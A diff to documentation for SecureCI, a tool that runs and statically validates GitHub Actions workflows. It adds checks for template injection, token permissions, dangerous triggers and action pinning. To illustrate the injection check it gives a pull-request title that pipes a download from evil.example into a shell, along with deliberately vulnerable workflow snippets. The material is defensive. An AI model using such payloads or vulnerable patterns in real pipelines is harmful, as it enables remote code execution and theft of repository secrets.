@@ -12,15 +12,21 @@ introduction and install steps, see the [README](README.md).
   - [Security: what runs where](#security-what-runs-where)
   - [`actions/checkout`](#actionscheckout)
 - [Global configuration](#global-configuration)
+- [Template injection checks (`validate`)](#template-injection-checks-validate)
+- [GITHUB_TOKEN permissions (`validate`)](#github_token-permissions-validate)
+- [Dangerous triggers (`pull_request_target`, `workflow_run`)](#dangerous-triggers-pull_request_target-workflow_run)
 - [Pipeline contracts (`validate --contract`)](#pipeline-contracts-validate---contract)
   - [Supply-chain pinning](#supply-chain-pinning)
   - [Requiring a lockfile](#requiring-a-lockfile)
+  - [Permissions policy](#permissions-policy)
+  - [Forbidding triggers](#forbidding-triggers)
   - [Advisory severity threshold](#advisory-severity-threshold)
   - [Contracts from another repository](#contracts-from-another-repository)
   - [Contract limitations (v1 scope)](#contract-limitations-v1-scope)
 - [Machine-readable output (`--format`)](#machine-readable-output---format)
 - [Action inventory and drift (`secureci inventory`)](#action-inventory-and-drift-secureci-inventory)
   - [GitHub's `actions.lock`](#githubs-actionslock)
+- [Pin actions to commit SHAs (`secureci pin`)](#pin-actions-to-commit-shas-secureci-pin)
 - [Known security advisories](#known-security-advisories)
 - [Use in CI (GitHub Action)](#use-in-ci-github-action)
   - [Generate the workflow (`secureci init workflow`)](#generate-the-workflow-secureci-init-workflow)
@@ -45,7 +51,7 @@ introduction and install steps, see the [README](README.md).
 
 `run` **executes** the workflow (one container per job by default). To check a
 workflow without running anything, use [`validate`](#machine-readable-output---format)
-(static syntax/contract/expression checks) or `run --dry-run` (simulate, showing
+(static syntax, expression, template-injection, trigger and contract checks) or `run --dry-run` (simulate, showing
 what would run). `run` prints a one-line reminder of these alternatives when it
 starts.
 
@@ -66,6 +72,10 @@ secureci inventory                 # bootstrap secureci.lock, or drift-check if 
 secureci inventory --dry-run       # just print the resolved inventory as JSON
 secureci inventory --update-lock   # (re)write ./secureci.lock
 secureci inventory --check         # compare against ./secureci.lock, fail on drift
+
+# Pin action tags to commit SHAs in place (owner/repo@<sha> # v4)
+secureci pin                       # every workflow, plus the local actions they use
+secureci pin --check               # fail if anything would change (for CI)
 
 # Generate a PR-checks workflow, list workflows, manage config/cache
 secureci init workflow
@@ -92,6 +102,40 @@ secureci run wf.yml --secret TOKEN=xxx
 # Repository variables for the vars context
 secureci run wf.yml --var ENVIRONMENT=staging
 ```
+
+### Values from files (`--env-file`, `--secret-file`, `--input-file`, `--var-file`)
+
+Each of `--env`, `--secret`, `--input` and `--var` has a file counterpart that reads `KEY=value` pairs from a `.env`-style file:
+
+```bash
+secureci run wf.yml --env-file .env --secret-file .secrets \
+  --input-file inputs.env --var-file vars.env
+```
+
+- **Precedence:** every flag is repeatable and files are read in order, so later files override earlier ones. Explicit `--env`/`--secret`/`--input`/`--var` flags override values from files.
+- **Secrets:** every value from a `--secret-file` is masked in output like `--secret`, and in container mode reaches the container the same way (never on the client's command line; see [Secret Masking](#secret-masking)). On Linux and macOS, the CLI warns if a secret file is readable by group or others (`chmod 600` it); values are never logged.
+- **Errors:** a missing file, or a line that can't be parsed, stops the run before anything executes. Parse errors name `file:line` but never echo the line, since it may hold a secret.
+- **Config defaults:** `env-file`, `secret-file`, `input-file` and `var-file` in the [config file](#global-configuration) name files to read when the matching flag isn't given (relative paths resolve against the current directory). Passing the flag replaces the config default rather than adding to it.
+
+File format:
+
+```bash
+# Full-line comments and blank lines are ignored
+export NAME=value            # optional "export ", inline comment after whitespace
+URL=https://x.test/#anchor   # the URL keeps its #: a comment needs whitespace before it
+EMPTY=
+SINGLE='kept literally: $HOME \n # not a comment'
+DOUBLE="escapes: \n newline, \t tab, \" quote, \\ backslash"
+PEM="-----BEGIN KEY-----
+multi-line values work in double quotes
+-----END KEY-----"
+```
+
+- Keys are letters, digits, `_` and `-` (not starting with a digit); whitespace around the key and around an unquoted value is trimmed. A later duplicate key wins.
+- Unquoted values run to the end of the line or to a `#` preceded by whitespace.
+- Single-quoted values are literal and must close on the same line.
+- Double-quoted values may span lines and support the escapes `\n`, `\r`, `\t`, `\"` and `\\`; any other backslash is kept as written. No `${VAR}` expansion is done.
+- CRLF line endings and a UTF-8 byte order mark are accepted. Only a comment may follow a closing quote.
 
 ## Container isolation
 
@@ -150,7 +194,19 @@ secureci config unset container-runtime        # revert to the built-in default 
 secureci config path                           # print the config file location
 ```
 
-Supported keys: `container-runtime`, `container-image`, `container-timeout`, `container-memory`, `allow-network`, and `runner-images.<label>`:
+Supported keys: `container-runtime`, `container-image`, `container-timeout`, `container-memory`, `allow-network`, `env-file`, `secret-file`, `input-file`, `var-file`, and `runner-images.<label>`.
+
+`env-file`, `secret-file`, `input-file` and `var-file` are default files for the matching `run` flags ([Values from files](#values-from-files---env-file---secret-file---input-file---var-file)). `config set` stores one path; edit the file by hand for a list, read in order:
+
+```yaml
+# ~/.secureci/config.yml
+secret-file: .secrets
+env-file:
+  - .env
+  - .env.local
+```
+
+`runner-images.<label>` maps a `runs-on` label to an image:
 
 ```bash
 secureci config set runner-images.ubuntu-latest node:20-bookworm   # map one runs-on label
@@ -163,6 +219,139 @@ runner-images:
   ubuntu-latest: node:20-bookworm
   my-self-hosted-runner: my/image:1
 ```
+
+## Template injection checks (`validate`)
+
+GitHub substitutes every `${{ }}` expression into a `run:` script **before** the shell sees it. If the expression is text an outside contributor controls, such as a pull request title, that text becomes part of the script:
+
+```yaml
+on: pull_request_target
+jobs:
+  greet:
+    runs-on: ubuntu-latest
+    steps:
+      # A PR titled `"; curl https://evil.example | sh; echo "` runs that command
+      - run: echo "Thanks for ${{ github.event.pull_request.title }}"
+```
+
+`secureci validate` reports this as an **error** (it is a code-execution path), with the SARIF rule `secureci/injection`:
+
+```
+[ERROR]   [ERROR] jobs.greet.steps[0].run: ${{ github.event.pull_request.title }} expands untrusted input (github.event.pull_request.title) into the shell script, so a crafted value can run arbitrary commands. Pass it through env: (e.g. env: TITLE: ${{ github.event.pull_request.title }}) and use "$TITLE" instead.
+```
+
+**The fix** is to pass the value through the environment and quote the variable, so the shell treats it as data:
+
+```yaml
+- run: echo "Thanks for $TITLE"
+  env:
+    TITLE: ${{ github.event.pull_request.title }}
+```
+
+What is checked:
+
+- **Where:** `run:` scripts, and the `script` input of `actions/github-script` (where the fix is `process.env.NAME`). Expressions in `env:` values are never flagged, since that is the fix; nor are other actions' `with:` inputs.
+- **Untrusted input:** the list kept in [`UNTRUSTED_CONTEXTS`](src/parser/injection.ts), based on [GitHub Security Lab's untrusted-input list](https://securitylab.github.com/resources/github-actions-untrusted-input/):
+  - `github.head_ref`
+  - issue, pull request, discussion, comment and review **titles and bodies** (`github.event.issue.title`, `github.event.pull_request.body`, `github.event.comment.body`, `github.event.review.body`, …)
+  - **branch names and labels** from the pull request head: `github.event.pull_request.head.ref`, `.head.label`, `.head.repo.default_branch`, and `github.event.workflow_run.head_branch` / `.pull_requests.*.head.ref`
+  - **commit messages and author/committer names and emails**: `.message`, `.author.name`, `.author.email`, `.committer.name` and `.committer.email` of `github.event.head_commit` and `github.event.commits.*`; `.message`, `.author.name` and `.author.email` of `github.event.workflow_run.head_commit`; and `github.event.workflow_run.display_title`
+  - **label names** on the issue or pull request (`github.event.issue.labels.*.name`, `github.event.pull_request.labels.*.name`) and wiki `github.event.pages.*.page_name`
+  - **inputs** of `workflow_dispatch` / `workflow_call` (`inputs.<name>` and `github.event.inputs.<name>`), except inputs typed `boolean`, `number`, `choice` or `environment`, which can't hold arbitrary text
+- **Not flagged:** values an outsider can't shape into a payload, e.g. `github.sha`, `github.run_id`, `github.repository`, `github.actor`, `github.ref`, `github.event.pull_request.number`, `secrets.*`, `matrix.*`, `steps.*.outputs.*`, `env.*`.
+- **Expressions are analyzed, not pattern-matched.** `contains()`, `startsWith()`, `endsWith()`, comparisons and `!` produce a boolean, so `${{ contains(github.event.issue.title, 'bug') }}` is safe. `format()`, `join()`, `fromJSON()` and `||` / `&&` pass their operands through, and `toJSON(github.event)` (or any object holding untrusted fields) is flagged. Each offending expression is reported separately.
+- **Local composite actions** (`uses: ./path`) and **local reusable workflows** (`jobs.<id>.uses: ./path.yml`) are followed recursively, with error paths like `jobs.build.steps[1] > ./.github/actions/greet > steps[0].run`. An action input the caller fills with untrusted input (`with: name: ${{ github.event.issue.title }}`), or whose `default:` is untrusted, is treated as untrusted inside that action. Remote actions and workflows are not inspected.
+- Validating a composite **action file** on its own checks its steps for untrusted contexts, but doesn't flag its own `inputs.*`, since what callers pass is unknown.
+
+Limitations: data that reaches a script indirectly (for example an untrusted value written to a step output or to `env:` and then expanded as `${{ steps.x.outputs.y }}` or `${{ env.Y }}`) is not tracked. `github.ref` / `github.ref_name` are not flagged, because only someone with push access to the repository chooses those names.
+
+## GITHUB_TOKEN permissions (`validate`)
+
+Every job gets a `GITHUB_TOKEN`. Without a `permissions:` block it gets the repository's (or organization's) default permissions, which on many repositories is read/write on every scope. `secureci validate` flags workflows that leave the token broader than it needs to be. These findings are **warnings** (rule `secureci/permissions` in SARIF): they're reported, but validation still passes. A [contract](#permissions-policy) can make them errors.
+
+| Finding                        | Reported at             | When                                                                                                                                                           |
+| ------------------------------ | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| No permissions declared        | `permissions`           | The workflow has no top-level `permissions:` and at least one job has none either. The message names those jobs. A job with its own `permissions:` is covered. |
+| `write-all` at the top level   | `permissions`           | `permissions: write-all` gives every job write access to every scope.                                                                                          |
+| A write scope at the top level | `permissions.<scope>`   | For example `contents: write` in the top-level block, which applies to every job. Declare it on the job that needs it instead.                                 |
+| `write-all` on a job           | `jobs.<id>.permissions` | The job's token can write to every scope. List only the scopes it needs.                                                                                       |
+
+- **Fine as they are:** `permissions: {}` (no access), `permissions: read-all`, and any mapping of `read` / `none` scopes, at either level. Write scopes on a job (not `write-all`) are not flagged; that's where they belong.
+- **Reusable workflows are exempt from the missing-block check.** A workflow whose only trigger is `on: workflow_call` runs with the token of the job that calls it, so the caller is where permissions are set. If it has any other trigger as well (for example `workflow_dispatch`), it is checked like any other workflow. The `write-all` and write-scope checks still apply to reusable workflows.
+- **Job-level permissions replace the top-level ones**, they don't add to them. When you move a write scope to a job, repeat the read scopes that job still needs:
+
+```yaml
+permissions:
+  contents: read # every job: read-only
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: npm test
+  release:
+    needs: test
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write # only this job can push tags and create releases
+    steps:
+      - uses: actions/checkout@v4
+      - run: npm run release
+```
+
+## Dangerous triggers (`pull_request_target`, `workflow_run`)
+
+`secureci validate` flags workflows that a fork could use to run code with your
+repository's privileges (a "pwn request"). Workflows triggered by
+`pull_request_target` or `workflow_run` run with the base repository's secrets
+and a read/write `GITHUB_TOKEN`, even when the pull request (or the run that
+triggered them) came from a fork.
+
+```yaml
+on: pull_request_target
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }} # the fork's code
+      - run: npm ci && npm test # runs it with secrets: error
+```
+
+- **Error**: a job checks out untrusted code with `actions/checkout`, then
+  later in the same job runs a `run:` step or a local action (`uses: ./…`).
+  The finding is reported once per job, at the checkout step, and names the
+  step that executes the code. A checkout counts as untrusted when its `ref:`
+  or `repository:` references `github.event.pull_request.head.sha`, `.head.ref`
+  or `.head.repo.full_name`, `github.event.pull_request.merge_commit_sha`,
+  `github.head_ref`, `github.event.workflow_run.head_sha`, `.head_branch`,
+  `.head_commit.id` or `.head_repository.full_name`, or a literal `refs/pull/…`
+  ref.
+- **Warning instead of error** when the job's `if:` is a label check
+  (`github.event.pull_request.labels…`, e.g.
+  `contains(github.event.pull_request.labels.*.name, 'safe to test')`, or
+  `github.event.label.name`): a maintainer must approve each run, so review the
+  pull request's code before applying the label.
+- **Warning** for the trigger alone (path `on.<trigger>`, once per privileged
+  trigger), so teams can audit every such workflow. It is **omitted when a
+  job-level finding above is reported**, so a workflow is never reported twice
+  for the same trigger.
+- **Not flagged**: a checkout of the base (no `ref:`, or e.g.
+  `github.event.pull_request.base.sha`), and an untrusted checkout with no
+  later `run:` step or local action in that job (e.g. only a remote action
+  that reads the files).
+- Every form of `on:` is recognized (`on: pull_request_target`, a list, or a
+  map). Warnings don't fail validation; an error does. In SARIF output these
+  findings use the rule `secureci/dangerous-trigger`.
+
+Limitations: only `actions/checkout` steps are inspected (a `git fetch`/`gh pr
+checkout` in a `run:` step is not), the untrusted ref must appear directly in
+`ref:`/`repository:` (not via an `env:` variable or a step output), a remote
+action run after the checkout is not treated as executing it, `environment:`
+protection rules are not recognized as a gate, and jobs that call a reusable
+workflow are not inspected. To forbid these triggers outright, use
+[`forbidden-triggers`](#forbidding-triggers) in a pipeline contract.
 
 ## Pipeline contracts (`validate --contract`)
 
@@ -215,6 +404,8 @@ allowed-owners: # if set, every remote action's owner must be listed
 
 Local (`./`) and `docker://` references are exempt from SHA pinning. An unpinned action or a disallowed owner is an **error**, reported at the step's call path.
 
+To fix unpinned actions, run [`secureci pin --contract <file>`](#pin-actions-to-commit-shas-secureci-pin): it rewrites tags to SHAs and leaves the `pins.allow` entries on their tags.
+
 ### Requiring a lockfile
 
 A contract can require every repository to commit a lockfile that covers what its workflows use:
@@ -240,6 +431,39 @@ advisories:
 Findings at or above `fail-on` become errors and the rest warnings. Any other value is a contract error.
 
 `--contract` runs the normal syntax validation too, and currently applies to workflow files only (not standalone actions, since the contract is about a job/step sequence). Passing `--contract` against an action file fails with a clear error.
+
+### Permissions policy
+
+A contract can turn the [GITHUB_TOKEN permissions](#github_token-permissions-validate) checks into a policy whose violations are **errors**:
+
+```yaml
+permissions:
+  required: true # every workflow (or every job) must declare permissions
+  max: # ceiling for the top-level block; write scopes only per job
+    contents: read
+```
+
+- **`required: true`**: a workflow without a top-level `permissions:` block in which any job also has none is an **error** at `permissions`, naming the jobs. Declaring permissions on every job satisfies it too.
+- **`max`**: a ceiling for the workflow's top-level `permissions:`. Each scope there must be at or below its level in `max`, and **scopes not listed in `max` are capped at `none`**. A scope above the ceiling is an **error** at `permissions.<scope>`. `read-all` and `write-all` at the top level are errors unless `max` allows that level for every scope. Job-level permissions are not capped, so write scopes go on the jobs that need them. A workflow with no top-level block, where any job relies on the default token, is also an error, since that token isn't held to the ceiling.
+- **Workflows whose only trigger is `workflow_call`** need no top-level block for either option, as above. A top-level block they do declare is still held to `max`.
+- When the contract turns a warning into an error, only the error is reported. Write scopes and `write-all` that the contract doesn't cover stay warnings.
+- Only the validated workflow file is checked, not the reusable workflows it calls; validate those files too (the [GitHub Action](#use-in-ci-github-action) validates every file in `.github/workflows` by default).
+- The contract file is checked strictly: `permissions` accepts only `required` (`true` or `false`) and `max`, and `max` takes GitHub's scope names (`actions`, `artifact-metadata`, `attestations`, `checks`, `contents`, `deployments`, `discussions`, `id-token`, `issues`, `models`, `packages`, `pages`, `pull-requests`, `repository-projects`, `security-events`, `statuses`) with the values `read`, `write` or `none`. Anything else fails with an error naming the key.
+
+### Forbidding triggers
+
+A contract can forbid events outright, whatever the workflow does with them:
+
+```yaml
+forbidden-triggers:
+  - pull_request_target
+  - workflow_run
+```
+
+Each forbidden event in a workflow's `on:` (string, list or map form) is an
+**error** at `on.<event>`, reported with the SARIF rule `secureci/contract`.
+Only the validated workflow's own `on:` is checked: a reusable workflow it
+calls runs under the caller's event. The value must be a list of strings.
 
 ### Contracts from another repository
 
@@ -273,7 +497,7 @@ secureci validate .github/workflows/ci.yml --contract contract.yml --format sari
 ```
 
 - **`json`**: `{ file, valid, errors: [{ path, message, severity }] }`.
-- **`sarif`**: a SARIF 2.1.0 log (rules `secureci/validation`, `secureci/contract`, `secureci/expression`, `secureci/vulnerable-action`). Upload it with `github/codeql-action/upload-sarif` to see findings inline on pull requests in GitHub code scanning.
+- **`sarif`**: a SARIF 2.1.0 log (rules `secureci/validation`, `secureci/contract`, `secureci/expression`, `secureci/injection`, `secureci/permissions`, `secureci/dangerous-trigger`, `secureci/vulnerable-action`). Upload it with `github/codeql-action/upload-sarif` to see findings inline on pull requests in GitHub code scanning.
 
 ## Action inventory and drift (`secureci inventory`)
 
@@ -346,6 +570,36 @@ GitHub's [workflow dependency lockfiles](https://docs.github.com/actions/concept
 
 `actions.lock` lists transitive dependencies and each repository's `owner_id` and `repo_id`, so the transitive and identity checks apply to it too. Entries SecureCI doesn't find are never reported as unused, because `gh actions-lock` may record dependencies SecureCI doesn't follow. Lockfile versions `v0.0.2` and `v0.0.3` are supported; a newer format fails with a clear error until SecureCI supports it.
 
+## Pin actions to commit SHAs (`secureci pin`)
+
+A tag like `@v4` can be moved to different code at any time; a full commit SHA can't. `secureci pin` rewrites each tag or branch to the commit it points at now, and keeps the tag in a trailing comment so Dependabot and Renovate can still offer updates:
+
+```yaml
+- uses: actions/checkout@v4
+# becomes
+- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4
+```
+
+```bash
+secureci pin                                  # every file in .github/workflows, plus the local actions and reusable workflows they use
+secureci pin .github/workflows/ci.yml         # just this file (local actions it uses aren't followed)
+secureci pin --check                          # change nothing; fail if anything would change (for CI)
+secureci pin --contract contracts/standard.yml # leave the contract's pins.allow owners/actions on their tags
+secureci pin --offline                        # use only the action cache, no network
+secureci pin --update-lock                    # then rewrite ./secureci.lock from the pinned workflows
+```
+
+Each change is printed as `file:line owner/repo@v4 -> <sha12> (v4)`, followed by a count.
+
+- **What is pinned:** step `uses:` in workflows and in local composite actions, and reusable-workflow calls (`jobs.<id>.uses: owner/repo/.github/workflows/x.yml@v1`).
+- **What is left alone:** local (`./`) and `docker://` references, references already pinned to a 40-character SHA, and, with `--contract`, the owners and actions its [`pins.allow`](#supply-chain-pinning) lists. These are matched the way the contract check matches them (an owner, or the exact action name), so `validate --contract` passes afterwards.
+- **Formatting is kept.** Files are edited in place, never re-serialised: only the value (keeping its single or double quotes) and its trailing comment change. Blank lines, other comments, key order and `- uses:` list items stay as they are. Running `pin` again changes nothing.
+- **Comments:** with no comment, `# v4` is added. An old version comment (`# v3`, `# v3.2.1`, `# tag=v3`) is replaced, keeping any words after it. Any other comment is kept after the tag (`# v4 - needed for the audit`). When several references share one line (a flow sequence), no comment is added.
+- **Resolution** is the same as `inventory`'s: `git ls-remote`, or the GitHub API when a token is available (`GITHUB_TOKEN`, `GH_TOKEN` or `gh auth token`). Each distinct reference is looked up once. `--offline` uses only the commits recorded in the action cache by earlier `run` or `inventory` runs. For a branch (`@main`) that is the last commit seen, not necessarily the current one.
+- **Unresolvable references** (a deleted or private repository, a missing ref, or anything not cached with `--offline`) are reported with their file and line and left unchanged. `pin` still pins everything else and exits 0; `pin --check` exits non-zero. A reference with no `@ref`, or one written as a YAML block scalar, is reported the same way.
+- **`--check`** writes nothing and exits non-zero if any reference would be pinned or can't be resolved. Use it in CI to keep workflows pinned.
+- **`--update-lock`** runs [`inventory --update-lock`](#drift-against-secureciclock) after pinning, so `secureci.lock` records the new `owner/repo@<sha>` references. It can't be combined with `--check`.
+
 ## Known security advisories
 
 `secureci inventory` and `secureci validate` check the actions a workflow uses against the [GitHub Advisory Database](https://github.com/advisories?query=ecosystem%3Aactions) and report published vulnerabilities, such as [GHSA-mrrh-fwg8-r2c3](https://github.com/advisories/GHSA-mrrh-fwg8-r2c3) in `tj-actions/changed-files` before 46.0.1.
@@ -376,10 +630,12 @@ name: SecureCI
 on: [pull_request]
 permissions:
   contents: read
-  security-events: write # for the SARIF upload
 jobs:
   secureci:
     runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      security-events: write # for the SARIF upload
     steps:
       - uses: actions/checkout@v4
       - uses: secure-ci/cli@v0.4.0 # a release tag; see below
@@ -407,7 +663,7 @@ secureci init workflow --no-upload                        # keep contents: read 
 secureci init workflow --output .github/workflows/ci-security.yml
 ```
 
-It refuses to overwrite an existing file unless you pass `--force`, and the file it writes passes `secureci validate`.
+It refuses to overwrite an existing file unless you pass `--force`, and the file it writes passes `secureci validate` with no findings: `contents: read` at the top level, and `security-events: write` (for the upload) on the job.
 
 ## Using output as audit evidence
 
@@ -566,7 +822,7 @@ Steps receive the runner's default variables, derived from the local `github` co
 
 ### Secret masking
 
-Any value passed via `--secret`, or registered by a step via `::add-mask::`, is automatically masked (`***`) wherever it appears in log output.
+Any value passed via `--secret` or read from a `--secret-file`, or registered by a step via `::add-mask::`, is automatically masked (`***`) wherever it appears in log output.
 
 In container mode, env values (secrets included) never appear in the container client's command line: they're passed in a private env file (mode `0600`, deleted as soon as the client exits), or, for values an env file can't carry verbatim (multi-line, quote-leading or whitespace-padded), by name with the value in the client's environment. Prefer `--secret NAME` over `--secret NAME=value` so the value isn't in the `secureci` command line either.
 
@@ -628,6 +884,7 @@ src/
 ├── utils/
 │   ├── logger.ts             # Logging utility with secret masking
 │   ├── key-value.ts          # --input/--secret/--env parsing
+│   ├── env-file.ts           # --env-file/--secret-file/... parsing and precedence
 │   └── repository.ts         # Repository root for ./ references
 └── types/
     └── index.ts              # TypeScript types
